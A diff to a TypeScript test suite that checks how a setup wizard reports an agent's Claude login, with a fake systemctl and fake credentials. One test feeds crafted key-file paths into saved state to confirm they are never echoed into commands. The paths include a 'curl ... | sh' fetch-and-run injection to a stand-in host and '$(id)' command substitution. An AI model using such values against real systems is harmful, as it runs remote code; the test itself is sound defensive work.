@@ -15,6 +15,7 @@ import { BRAND } from '../src/brand.js';
 import { emptyAutoConfig, SETUP_BRANCH } from '../src/auto-config.js';
 import { loadConfig, loadConfigAt } from '../src/config/load.js';
 import { localServiceSpec } from '../src/service.js';
+import { initInstance } from '../src/instance.js';
 import { doctor } from '../src/doctor.js';
 import { projectStateDir } from '../src/guardrails/context.js';
 import { firstRunLiveView, initCommand, localInitFile, newState, readInitState, setupContext, type InitArgs, type InitIo } from '../src/init.js';
@@ -364,6 +365,70 @@ test('#738 round 2: server mode, the recorded login of the agent user must be on
   assert.equal(same.detail, 'wl-shop-agent is signed in (claude.ai), per claude auth status as that user at 2026-10-19T10:00:00Z; token 0123abcd', 'a matching login reads as before');
 });
 
+/** Run `fn` with this process's environment set to `env` (PATH, HOME, ...), every login variable cleared first; restored after. */
+function withEnv<T>(env: NodeJS.ProcessEnv, fn: () => T): T {
+  const saved = { ...process.env };
+  try {
+    for (const k of Object.keys(process.env)) if (/^(ANTHROPIC_|CLAUDE_CODE_OAUTH_TOKEN$|CLAUDE_CONFIG_DIR$)/.test(k)) delete process.env[k];
+    Object.assign(process.env, env);
+    return fn();
+  } finally {
+    for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
+    Object.assign(process.env, saved);
+  }
+}
+
+test("#738 round 3: when the user service manager can't be read, the step is not done and says why (no proof call)", { skip: posixOnly }, () => {
+  const fake = fakeClaude();
+  const home = mkdtempSync(join(tmpdir(), 'cr-home-'));
+  mkdirSync(join(home, '.fake-claude'));
+  writeFileSync(join(home, '.fake-claude', 'method'), 'claude.ai');
+  mkdirSync(join(home, '.fake-manager'));
+  writeFileSync(join(home, '.fake-manager', 'down'), '');
+  const root = existingProject('cli');
+  const step = withEnv({ PATH: [fake.dir, dirname(process.execPath), '/usr/bin', '/bin'].join(delimiter), HOME: home, [`${BRAND.envPrefix}_PREFIX`]: join(home, '.local') }, () =>
+    checkSetup(setupContext(null, { mode: 'local', root, repo: REPO, instance: null, stateDir: projectStateDir(root), policyFile: null }), systemProbe()).groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-login')!,
+  );
+  assert.equal(step.done, false, step.detail);
+  assert.match(step.detail, /can't tell which Claude login the coordinator's service gives its agents: it inherits CLAUDE_CONFIG_DIR, ANTHROPIC_API_KEY, ANTHROPIC_AUTH_TOKEN, CLAUDE_CODE_OAUTH_TOKEN from this user's service manager, and that couldn't be read \(systemctl --user show-environment failed: Failed to connect to bus: No medium found\)/);
+});
+
+test('#738 round 3: server mode while the setup PR waits (the checkout has no valid config): a matching record reads as on main, read from credentials.yaml alone', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'cr-instances-'));
+  const p = newProject();
+  initInstance('gamma', p.root, REPO, dir, 'wl-gamma-agent', '/home/example');
+  const accountDir = join(mkdtempSync(join(tmpdir(), 'cr-machine-')), 'claude-account');
+  mkdirSync(accountDir);
+  const step = (method: string) => {
+    writeFileSync(join(accountDir, 'status.json'), JSON.stringify({ at: '2026-10-19T10:00:00Z', users: [{ instance: 'gamma', kind: 'agent', user: 'wl-gamma-agent', stored: true, logged_in: true, auth_method: method, token_id: '0123abcd' }] }));
+    const ctx = { ...setupContext(null, { mode: 'server', root: p.root, repo: REPO, instance: 'gamma', stateDir: projectStateDir(p.root), policyFile: null }), machine: { claudeAccountDir: accountDir } };
+    return withEnv({ [`${BRAND.envPrefix}_INSTANCES_DIR`]: dir }, () => checkSetup(ctx, world({ method: null }).probe).groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-token')!);
+  };
+  const ok = step('claude.ai');
+  assert.equal(ok.done, true, ok.detail);
+  assert.equal(ok.detail, 'wl-gamma-agent is signed in (claude.ai), per claude auth status as that user at 2026-10-19T10:00:00Z; token 0123abcd', "main's words");
+  assert.equal(step('api_key_helper').done, false, 'a subscription instance (no agent_api_key) refuses an API-key login');
+  // An API-key instance: credentials.yaml names agent_api_key; still no valid repo config.
+  const creds = join(dir, 'gamma', 'credentials.yaml');
+  writeFileSync(creds, `${readFileSync(creds, 'utf8')}agent_api_key: ${JSON.stringify(join(dir, 'gamma', 'agent-key'))}\n`);
+  assert.equal(step('api_key_helper').done, true, step('api_key_helper').detail);
+  assert.match(step('claude.ai').detail, /the instance runs on an API key \(credentials\.yaml agent_api_key\)/);
+});
+
+test("#738 round 3: a key file path read back from init's state is shown only when it is a plain absolute path", () => {
+  const p = newProject();
+  for (const crafted of ['/k; curl -s http://example.invalid/x | sh; #', '/k", "env": {"X": "1"}, "y": "', '/k\nPATH=/evil', "/k'$(id)'"]) {
+    const state = newState('local', p.root, REPO, null);
+    state.agentRuntime = { kind: 'api_key', keyFile: crafted } as never;
+    for (const method of ['claude.ai', 'api_key_helper']) {
+      const c = checkSetup(setupContext(state, { mode: 'local', root: p.root, repo: REPO, instance: null, stateDir: projectStateDir(p.root), policyFile: null }), world({ method }).probe)
+        .groups.flatMap((g) => g.steps).find((x) => x.id === 'claude-login')!;
+      assert.equal((c.fix as { command?: string }).command, '"apiKeyHelper": "cat -- <your key file>"', `${JSON.stringify(crafted)}: ${JSON.stringify(c.fix)}`);
+      assert.ok(!c.detail.includes(crafted) && !c.detail.includes('/k'), `${JSON.stringify(crafted)} is not in the detail: ${c.detail}`);
+    }
+  }
+});
+
 // ---------- the wizard and the runner agree, with a fake claude on PATH and a scratch HOME ----------
 
 /** A fake claude: signs in as a key in its environment would (ANTHROPIC_API_KEY, then CLAUDE_CODE_OAUTH_TOKEN), else as its home says. */
@@ -396,6 +461,24 @@ setTimeout(() => process.exit(0), 200);
 `,
   );
   chmodSync(bin, 0o755);
+  // A stand-in systemd user manager: `--user show-environment` prints what $HOME/.fake-manager/env sets (a
+  // manager's environment.d or set-environment), or fails as with no bus when $HOME/.fake-manager/down exists.
+  writeFileSync(
+    join(dir, 'systemctl'),
+    `#!/bin/sh
+m="\${HOME:-/nonexistent}/.fake-manager"
+if [ "$1 $2" = "--user show-environment" ]; then
+  if [ -e "$m/down" ]; then echo "Failed to connect to bus: No medium found" >&2; exit 1; fi
+  echo "PATH=/usr/local/bin:/usr/bin:/bin"
+  echo "HOME=$HOME"
+  if [ -f "$m/env" ]; then cat "$m/env"; fi
+  exit 0
+fi
+echo "systemctl stand-in: $* is not something it does" >&2
+exit 1
+`,
+  );
+  chmodSync(join(dir, 'systemctl'), 0o755);
   return { dir, bin };
 }
 
@@ -404,9 +487,16 @@ const runReq = (cwd: string): RunRequest => ({ role: 'worker', prompt: 'p', cwd,
 test("#738: the step is done exactly when the local service's runs would start on that login (a fake claude on PATH, a scratch HOME)", { skip: posixOnly }, async (t) => {
   const fake = fakeClaude();
   // [kind, the login claude finds (in its home, or under the shell's CLAUDE_CONFIG_DIR), what else the person's
-  // shell has, done/starts?]. The runner is the local service's: its base is localServiceSpec's environment, PATH and
-  // HOME only, as `up` and the first-run page's Start install it (src/service.ts).
-  const cases: ['cli' | 'api_key', string | null, Record<string, string>, boolean][] = [
+  // shell has, done/starts?, what the user service manager sets]. The runner is the local service's, built as
+  // src/service.ts builds it on the service's real environment: the manager's, then the unit's own (localServiceSpec:
+  // PATH and HOME) on top. A manager CLAUDE_CONFIG_DIR given as 'DIR:<method>' is a directory whose login is that.
+  const cases: ['cli' | 'api_key', string | null, Record<string, string>, boolean, Record<string, string>?][] = [
+    ['cli', 'claude.ai', {}, false, { CLAUDE_CONFIG_DIR: 'DIR:api_key_helper' }],
+    ['cli', null, {}, true, { CLAUDE_CONFIG_DIR: 'DIR:claude.ai' }],
+    ['cli', 'claude.ai', {}, true, { ANTHROPIC_API_KEY: 'sk-ant-manager-key-738' }],
+    ['cli', null, {}, false, { CLAUDE_CODE_OAUTH_TOKEN: 'manager-token-738' }],
+    ['api_key', null, {}, true, { ANTHROPIC_API_KEY: 'sk-ant-manager-key-738' }],
+    ['api_key', 'claude.ai', {}, false, { ANTHROPIC_AUTH_TOKEN: 'manager-auth-738' }],
     ['cli', 'claude.ai', {}, true],
     ['cli', 'claude.ai', { ANTHROPIC_API_KEY: 'sk-ant-env-key-738' }, true],
     ['cli', null, { CLAUDE_CODE_OAUTH_TOKEN: 'env-token-738' }, false],
@@ -425,9 +515,21 @@ test("#738: the step is done exactly when the local service's runs would start o
   const saved = { ...process.env };
   try {
     // One subtest per case, so each is reported on its own (and in a fail-without run).
-    for (const [kind, login, extra, expected] of cases) await t.test(`${kind}, ${login ?? 'no login'} ${JSON.stringify(Object.keys(extra))}`, async () => {
+    for (const [kind, login, extra, expected, manager] of cases) await t.test(`${kind}, ${login ?? 'no login'} ${JSON.stringify(Object.keys(extra))}${manager ? ` manager ${JSON.stringify(Object.keys(manager))}` : ''}`, async () => {
       const home = mkdtempSync(join(tmpdir(), 'cr-home-'));
       mkdirSync(join(home, '.fake-claude'));
+      const managerEnv: Record<string, string> = {};
+      for (const [k, v] of Object.entries(manager ?? {})) {
+        if (!v.startsWith('DIR:')) managerEnv[k] = v;
+        else {
+          const d = mkdtempSync(join(tmpdir(), 'cr-mgrdir-'));
+          mkdirSync(join(d, 'fake'));
+          writeFileSync(join(d, 'fake', 'method'), v.slice(4));
+          managerEnv[k] = d;
+        }
+      }
+      mkdirSync(join(home, '.fake-manager'));
+      writeFileSync(join(home, '.fake-manager', 'env'), Object.entries(managerEnv).map(([k, v]) => `${k}=${v}\n`).join(''));
       const shellOnly: Record<string, string> = {};
       if (login === 'cfgdir') {
         // claude.ai only under a CLAUDE_CONFIG_DIR the shell has; the service never gets that variable.
@@ -443,13 +545,16 @@ test("#738: the step is done exactly when the local service's runs would start o
       const root = existingProject(kind);
       const view = checkSetup(setupContext(null, { mode: 'local', root, repo: REPO, instance: null, stateDir: projectStateDir(root), policyFile: null }), systemProbe());
       const step = view.groups.flatMap((g) => g.steps).find((s) => s.id === 'claude-login')!;
-      const service = localServiceSpec(root, loadConfig(root)).env!;
-      assert.deepEqual(Object.keys(service).sort(), ['HOME', 'PATH'], "the local service's whole environment");
+      const unit = localServiceSpec(root, loadConfig(root)).env!;
+      assert.deepEqual(Object.keys(unit).sort(), ['HOME', 'PATH'], "the unit's own Environment= lines");
+      // The service process's environment: the manager's, with the unit's lines on top (systemd.exec(5)).
+      const service = { ...managerEnv, ...unit };
       const r = await new CliRunner(kind, service, fake.bin, undefined, undefined, undefined, { budgetMs: 0, sleep: async () => false }).run(runReq(root));
-      const label = `${kind}, ${login ?? 'no login'} ${JSON.stringify(Object.keys(extra))}`;
+      const label = `${kind}, ${login ?? 'no login'} ${JSON.stringify(Object.keys(extra))} manager ${JSON.stringify(Object.keys(managerEnv))}`;
       assert.equal(r.reason !== 'auth_mismatch', expected, `${label}: the runner ${r.reason}: ${r.detail}`);
       assert.equal(step.done, expected, `${label}: the step says ${step.detail}`);
-      if (kind === 'cli' && login === 'claude.ai') assert.equal(step.detail, SUBSCRIPTION_DONE, `${label}: the login the agents get, not the shell's key`);
+      if (kind === 'cli' && login === 'claude.ai' && !manager) assert.equal(step.detail, SUBSCRIPTION_DONE, `${label}: the login the agents get, not the shell's key`);
+      for (const v of Object.values(managerEnv)) if (!v.startsWith('/')) assert.ok(!step.detail.includes(v), `${label}: a manager value is never shown`);
     });
   } finally {
     for (const k of Object.keys(process.env)) if (!(k in saved)) delete process.env[k];
